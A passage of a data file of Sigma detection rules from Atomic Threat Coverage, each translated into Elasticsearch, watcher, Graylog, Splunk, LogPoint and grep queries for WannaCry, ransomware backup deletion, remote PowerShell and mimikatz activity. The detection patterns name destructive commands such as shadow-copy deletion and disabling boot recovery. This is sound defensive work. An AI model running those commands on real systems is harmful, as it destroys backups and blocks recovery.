'^(?:.*(?:.*(?:.*.*\\\\tasksche\\\\.exe|.*.*\\\\mssecsvc\\\\.exe|.*.*\\\\taskdl\\\\.exe|.*.*\\\\@WanaDecryptor@.*|.*.*\\\\WanaDecryptor.*|.*.*\\\\taskhsvc\\\\.exe|.*.*\\\\taskse\\\\.exe|.*.*\\\\111\\\\.exe|.*.*\\\\lhdfrgui\\\\.exe|.*.*\\\\diskpart\\\\.exe|.*.*\\\\linuxnew\\\\.exe|.*.*\\\\wannacry\\\\.exe)|.*(?:.*.*icacls .* /grant Everyone:F /T /C /Q.*|.*.*bcdedit /set \\\\{default\\\\} recoveryenabled no.*|.*.*wbadmin delete catalog -quiet.*|.*.*@Please_Read_Me@\\\\.txt.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Quick Execution of a Series of Suspicious Commands\nid: 61ab5496-748e-4818-a92f-de78e20fe7f1\ndescription: Detects multiple suspicious process in a limited timeframe\nstatus: experimental\nreferences:\n    - https://car.mitre.org/wiki/CAR-2013-04-002\nauthor: juju4\nmodified: 2012/12/11\ntags:\n    - car.2013-04-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - arp.exe\n            - at.exe\n            - attrib.exe\n            - cscript.exe\n            - dsquery.exe\n            - hostname.exe\n            - ipconfig.exe\n            - mimikatz.exe\n            - nbtstat.exe\n            - net.exe\n            - netsh.exe\n            - nslookup.exe\n            - ping.exe\n            - quser.exe\n            - qwinsta.exe\n            - reg.exe\n            - runas.exe\n            - sc.exe\n            - schtasks.exe\n            - ssh.exe\n            - systeminfo.exe\n            - taskkill.exe\n            - telnet.exe\n            - tracert.exe\n            - wscript.exe\n            - xcopy.exe\n            - pscp.exe\n            - copy.exe\n            - robocopy.exe\n            - certutil.exe\n            - vssadmin.exe\n            - powershell.exe\n            - wevtutil.exe\n            - psexec.exe\n            - bcedit.exe\n            - wbadmin.exe\n            - icacls.exe\n            - diskpart.exe\n    timeframe: 5m\n    condition: selection | count() by MachineName > 5\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Quick-Execution-of-a-Series-of-Suspicious-Commands <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Quick Execution of a Series of Suspicious Commands\",\\n    \"description\": \"Detects multiple suspicious process in a limited timeframe\",\\n    \"tags\": [\\n      \"car.2013-04-002\"\\n    ],\\n    \"query\": \"CommandLine:(\\\\\"arp.exe\\\\\" OR \\\\\"at.exe\\\\\" OR \\\\\"attrib.exe\\\\\" OR \\\\\"cscript.exe\\\\\" OR \\\\\"dsquery.exe\\\\\" OR \\\\\"hostname.exe\\\\\" OR \\\\\"ipconfig.exe\\\\\" OR \\\\\"mimikatz.exe\\\\\" OR \\\\\"nbtstat.exe\\\\\" OR \\\\\"net.exe\\\\\" OR \\\\\"netsh.exe\\\\\" OR \\\\\"nslookup.exe\\\\\" OR \\\\\"ping.exe\\\\\" OR \\\\\"quser.exe\\\\\" OR \\\\\"qwinsta.exe\\\\\" OR \\\\\"reg.exe\\\\\" OR \\\\\"runas.exe\\\\\" OR \\\\\"sc.exe\\\\\" OR \\\\\"schtasks.exe\\\\\" OR \\\\\"ssh.exe\\\\\" OR \\\\\"systeminfo.exe\\\\\" OR \\\\\"taskkill.exe\\\\\" OR \\\\\"telnet.exe\\\\\" OR \\\\\"tracert.exe\\\\\" OR \\\\\"wscript.exe\\\\\" OR \\\\\"xcopy.exe\\\\\" OR \\\\\"pscp.exe\\\\\" OR \\\\\"copy.exe\\\\\" OR \\\\\"robocopy.exe\\\\\" OR \\\\\"certutil.exe\\\\\" OR \\\\\"vssadmin.exe\\\\\" OR \\\\\"powershell.exe\\\\\" OR \\\\\"wevtutil.exe\\\\\" OR \\\\\"psexec.exe\\\\\" OR \\\\\"bcedit.exe\\\\\" OR \\\\\"wbadmin.exe\\\\\" OR \\\\\"icacls.exe\\\\\" OR \\\\\"diskpart.exe\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"5m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine:(\\\\\"arp.exe\\\\\" OR \\\\\"at.exe\\\\\" OR \\\\\"attrib.exe\\\\\" OR \\\\\"cscript.exe\\\\\" OR \\\\\"dsquery.exe\\\\\" OR \\\\\"hostname.exe\\\\\" OR \\\\\"ipconfig.exe\\\\\" OR \\\\\"mimikatz.exe\\\\\" OR \\\\\"nbtstat.exe\\\\\" OR \\\\\"net.exe\\\\\" OR \\\\\"netsh.exe\\\\\" OR \\\\\"nslookup.exe\\\\\" OR \\\\\"ping.exe\\\\\" OR \\\\\"quser.exe\\\\\" OR \\\\\"qwinsta.exe\\\\\" OR \\\\\"reg.exe\\\\\" OR \\\\\"runas.exe\\\\\" OR \\\\\"sc.exe\\\\\" OR \\\\\"schtasks.exe\\\\\" OR \\\\\"ssh.exe\\\\\" OR \\\\\"systeminfo.exe\\\\\" OR \\\\\"taskkill.exe\\\\\" OR \\\\\"telnet.exe\\\\\" OR \\\\\"tracert.exe\\\\\" OR \\\\\"wscript.exe\\\\\" OR \\\\\"xcopy.exe\\\\\" OR \\\\\"pscp.exe\\\\\" OR \\\\\"copy.exe\\\\\" OR \\\\\"robocopy.exe\\\\\" OR \\\\\"certutil.exe\\\\\" OR \\\\\"vssadmin.exe\\\\\" OR \\\\\"powershell.exe\\\\\" OR \\\\\"wevtutil.exe\\\\\" OR \\\\\"psexec.exe\\\\\" OR \\\\\"bcedit.exe\\\\\" OR \\\\\"wbadmin.exe\\\\\" OR \\\\\"icacls.exe\\\\\" OR \\\\\"diskpart.exe\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"MachineName.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"desc\"\\n                },\\n                \"min_doc_count\": 6\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.doc_count\": {\\n        \"gt\": 5\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Quick Execution of a Series of Suspicious Commands\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.by.buckets}}\\\\n {{key}} {{doc_count}}\\\\n{{/aggregations.by.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine=\"arp.exe\" OR CommandLine=\"at.exe\" OR CommandLine=\"attrib.exe\" OR CommandLine=\"cscript.exe\" OR CommandLine=\"dsquery.exe\" OR CommandLine=\"hostname.exe\" OR CommandLine=\"ipconfig.exe\" OR CommandLine=\"mimikatz.exe\" OR CommandLine=\"nbtstat.exe\" OR CommandLine=\"net.exe\" OR CommandLine=\"netsh.exe\" OR CommandLine=\"nslookup.exe\" OR CommandLine=\"ping.exe\" OR CommandLine=\"quser.exe\" OR CommandLine=\"qwinsta.exe\" OR CommandLine=\"reg.exe\" OR CommandLine=\"runas.exe\" OR CommandLine=\"sc.exe\" OR CommandLine=\"schtasks.exe\" OR CommandLine=\"ssh.exe\" OR CommandLine=\"systeminfo.exe\" OR CommandLine=\"taskkill.exe\" OR CommandLine=\"telnet.exe\" OR CommandLine=\"tracert.exe\" OR CommandLine=\"wscript.exe\" OR CommandLine=\"xcopy.exe\" OR CommandLine=\"pscp.exe\" OR CommandLine=\"copy.exe\" OR CommandLine=\"robocopy.exe\" OR CommandLine=\"certutil.exe\" OR CommandLine=\"vssadmin.exe\" OR CommandLine=\"powershell.exe\" OR CommandLine=\"wevtutil.exe\" OR CommandLine=\"psexec.exe\" OR CommandLine=\"bcedit.exe\" OR CommandLine=\"wbadmin.exe\" OR CommandLine=\"icacls.exe\" OR CommandLine=\"diskpart.exe\") | eventstats count as val by MachineName| search val > 5", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"arp.exe\", \"at.exe\", \"attrib.exe\", \"cscript.exe\", \"dsquery.exe\", \"hostname.exe\", \"ipconfig.exe\", \"mimikatz.exe\", \"nbtstat.exe\", \"net.exe\", \"netsh.exe\", \"nslookup.exe\", \"ping.exe\", \"quser.exe\", \"qwinsta.exe\", \"reg.exe\", \"runas.exe\", \"sc.exe\", \"schtasks.exe\", \"ssh.exe\", \"systeminfo.exe\", \"taskkill.exe\", \"telnet.exe\", \"tracert.exe\", \"wscript.exe\", \"xcopy.exe\", \"pscp.exe\", \"copy.exe\", \"robocopy.exe\", \"certutil.exe\", \"vssadmin.exe\", \"powershell.exe\", \"wevtutil.exe\", \"psexec.exe\", \"bcedit.exe\", \"wbadmin.exe\", \"icacls.exe\", \"diskpart.exe\"]) | chart count() as val by MachineName | search val > 5", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*arp\\\\.exe|.*at\\\\.exe|.*attrib\\\\.exe|.*cscript\\\\.exe|.*dsquery\\\\.exe|.*hostname\\\\.exe|.*ipconfig\\\\.exe|.*mimikatz\\\\.exe|.*nbtstat\\\\.exe|.*net\\\\.exe|.*netsh\\\\.exe|.*nslookup\\\\.exe|.*ping\\\\.exe|.*quser\\\\.exe|.*qwinsta\\\\.exe|.*reg\\\\.exe|.*runas\\\\.exe|.*sc\\\\.exe|.*schtasks\\\\.exe|.*ssh\\\\.exe|.*systeminfo\\\\.exe|.*taskkill\\\\.exe|.*telnet\\\\.exe|.*tracert\\\\.exe|.*wscript\\\\.exe|.*xcopy\\\\.exe|.*pscp\\\\.exe|.*copy\\\\.exe|.*robocopy\\\\.exe|.*certutil\\\\.exe|.*vssadmin\\\\.exe|.*powershell\\\\.exe|.*wevtutil\\\\.exe|.*psexec\\\\.exe|.*bcedit\\\\.exe|.*wbadmin\\\\.exe|.*icacls\\\\.exe|.*diskpart\\\\.exe)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Non Interactive PowerShell\nid: f4bbd493-b796-416e-bbf2-121235348529\ndescription: Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent.\nstatus: experimental\ndate: 2019/09/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/basic_powershell_execution.md\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection: \n        Image|endswith: '\\powershell.exe'\n    filter:\n        ParentImage|endswith: '\\explorer.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND (NOT (ParentImage.keyword:*\\\\\\\\explorer.exe)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Non-Interactive-PowerShell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Non Interactive PowerShell\",\\n    \"description\": \"Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent.\",\\n    \"tags\": \"\",\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND (NOT (ParentImage.keyword:*\\\\\\\\\\\\\\\\explorer.exe)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND (NOT (ParentImage.keyword:*\\\\\\\\\\\\\\\\explorer.exe)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Non Interactive PowerShell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND (NOT (ParentImage.keyword:*\\\\\\\\explorer.exe)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\powershell.exe\" NOT (ParentImage=\"*\\\\\\\\explorer.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\powershell.exe\"  -(ParentImage=\"*\\\\\\\\explorer.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\explorer\\\\.exe)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Ransomware Deletes Volume Shadow Copies\nid: 4eebe114-4b24-4a9d-9a6c-c7bd7c8eaa61\nstatus: experimental\ndescription: Detects commands that delete all local volume shadow copies as used by different Ransomware families\nreferences:\n    - https://www.bleepingcomputer.com/news/security/why-everyone-should-disable-vssadmin-exe-now/\n    - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100\nauthor: Florian Roth\ndate: 2019/06/01\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*vssadmin delete shadows*'\n            - '*wmic SHADOWCOPY DELETE*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Adminsitrative scripts - e.g. to prepare image for golden image creation\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*vssadmin\\\\ delete\\\\ shadows* OR *wmic\\\\ SHADOWCOPY\\\\ DELETE*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Ransomware-Deletes-Volume-Shadow-Copies <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Ransomware Deletes Volume Shadow Copies\",\\n    \"description\": \"Detects commands that delete all local volume shadow copies as used by different Ransomware families\",\\n    \"tags\": \"\",\\n    \"query\": \"CommandLine.keyword:(*vssadmin\\\\\\\\ delete\\\\\\\\ shadows* OR *wmic\\\\\\\\ SHADOWCOPY\\\\\\\\ DELETE*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*vssadmin\\\\\\\\ delete\\\\\\\\ shadows* OR *wmic\\\\\\\\ SHADOWCOPY\\\\\\\\ DELETE*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Ransomware Deletes Volume Shadow Copies\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*vssadmin delete shadows* *wmic SHADOWCOPY DELETE*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*vssadmin delete shadows*\" OR CommandLine=\"*wmic SHADOWCOPY DELETE*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*vssadmin delete shadows*\", \"*wmic SHADOWCOPY DELETE*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*vssadmin delete shadows.*|.*.*wmic SHADOWCOPY DELETE.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Remote PowerShell Sessions\nid: 13acf386-b8c6-4fe0-9a6e-c4756b974698\ndescription: Detects basic PowerShell Remoting by monitoring for network inbound connections to ports 5985 OR 5986\nstatus: experimental\ndate: 2019/09/12\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/powershell_remote_session.md\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 5156\n        DestPort:\n            - 5985\n            - 5986\n        LayerRTID: 44\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5156\" AND DestPort:(\"5985\" OR \"5986\") AND LayerRTID:\"44\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Remote-PowerShell-Sessions <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Remote PowerShell Sessions\",\\n    \"description\": \"Detects basic PowerShell Remoting by monitoring for network inbound connections to ports 5985 OR 5986\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"5156\\\\\" AND DestPort:(\\\\\"5985\\\\\" OR \\\\\"5986\\\\\") AND LayerRTID:\\\\\"44\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5156\\\\\" AND DestPort:(\\\\\"5985\\\\\" OR \\\\\"5986\\\\\") AND LayerRTID:\\\\\"44\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Remote PowerShell Sessions\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5156\" AND DestPort:(\"5985\" \"5986\") AND LayerRTID:\"44\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5156\" (DestPort=\"5985\" OR DestPort=\"5986\") LayerRTID=\"44\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5156\" DestPort IN [\"5985\", \"5986\"] LayerRTID=\"44\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5156)(?=.*(?:.*5985|.*5986))(?=.*44))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Remote PowerShell Session\nid: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8\ndescription: Detects remote PowerShell seccions by monitoring for wsmprovhost as a parent or child process (sign of an active ps remote sessionn)\nstatus: experimental\ndate: 2019/09/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/powershell_remote_session.md\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\wsmprovhost.exe OR ParentImage.keyword:*\\\\\\\\wsmprovhost.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Remote-PowerShell-Session <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Remote PowerShell Session\",\\n    \"description\": \"Detects remote PowerShell seccions by monitoring for wsmprovhost as a parent or child process (sign of an active ps remote sessionn)\",\\n    \"tags\": \"\",\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\wsmprovhost.exe OR ParentImage.keyword:*\\\\\\\\\\\\\\\\wsmprovhost.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\wsmprovhost.exe OR ParentImage.keyword:*\\\\\\\\\\\\\\\\wsmprovhost.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Remote PowerShell Session\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\wsmprovhost.exe OR ParentImage.keyword:*\\\\\\\\wsmprovhost.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\wsmprovhost.exe\" OR ParentImage=\"*\\\\\\\\wsmprovhost.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\wsmprovhost.exe\" OR ParentImage=\"*\\\\\\\\wsmprovhost.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\wsmprovhost\\\\.exe|.*.*\\\\wsmprovhost\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1000 SCM Database Handle Failure\nid: 13addce7-47b2-4ca0-a98f-1de964d1d669\ndescription: Detects non-system users failing to get a handle of the SCM database.\nstatus: experimental\ndate: 2019/08/12\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/07_discovery/T1000_local_admin_check/local_admin_remote_check_openscmanager.md\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4656\n        ObjectType: 'SC_MANAGER OBJECT'\n        ObjectName: 'servicesactive'\n        Keywords: \"Audit Failure\"\n        SubjectLogonId: \"0x3e4\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4656\" AND ObjectType:\"SC_MANAGER\\\\ OBJECT\" AND ObjectName:\"servicesactive\" AND Keywords:\"Audit\\\\ Failure\" AND SubjectLogonId:\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1000-SCM-Database-Handle-Failure <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1000 SCM Database Handle Failure\",\\n    \"description\": \"Detects non-system users failing to get a handle of the SCM database.\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"4656\\\\\" AND ObjectType:\\\\\"SC_MANAGER\\\\\\\\ OBJECT\\\\\" AND ObjectName:\\\\\"servicesactive\\\\\" AND Keywords:\\\\\"Audit\\\\\\\\ Failure\\\\\" AND SubjectLogonId:\\\\\"0x3e4\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4656\\\\\" AND ObjectType:\\\\\"SC_MANAGER\\\\\\\\ OBJECT\\\\\" AND ObjectName:\\\\\"servicesactive\\\\\" AND Keywords:\\\\\"Audit\\\\\\\\ Failure\\\\\" AND SubjectLogonId:\\\\\"0x3e4\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1000 SCM Database Handle Failure\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4656\" AND ObjectType:\"SC_MANAGER OBJECT\" AND ObjectName:\"servicesactive\" AND Keywords:\"Audit Failure\" AND SubjectLogonId:\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4656\" ObjectType=\"SC_MANAGER OBJECT\" ObjectName=\"servicesactive\" Keywords=\"Audit Failure\" SubjectLogonId=\"0x3e4\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" 